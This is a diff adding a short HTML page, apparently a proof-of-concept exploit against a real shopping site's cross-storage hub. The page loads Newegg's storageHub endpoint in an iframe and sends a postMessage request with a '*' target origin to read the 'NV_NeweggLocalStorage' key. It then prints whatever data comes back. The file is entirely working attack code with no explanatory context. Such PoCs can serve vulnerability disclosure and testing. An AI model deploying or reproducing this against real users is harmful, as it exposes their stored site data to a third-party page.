@@ -1,0 +1,17 @@
+<html><body>
+<pre id="out">Waiting for response...</pre>
+<script>
+var hub = document.createElement('iframe');
+hub.src = 'https://www.newegg.com/api/storageHub';
+document.body.appendChild(hub);
+window.addEventListener('message', function(e){
+  document.getElementById('out').innerText += '\nGOT: ' + e.data;
+});
+hub.onload = function(){
+  hub.contentWindow.postMessage(JSON.stringify({
+    id:1, action:'cross-storage:get',
+    params:{key:'NV_NeweggLocalStorage'}
+  }), '*');
+};
+</script>
+</body></html>
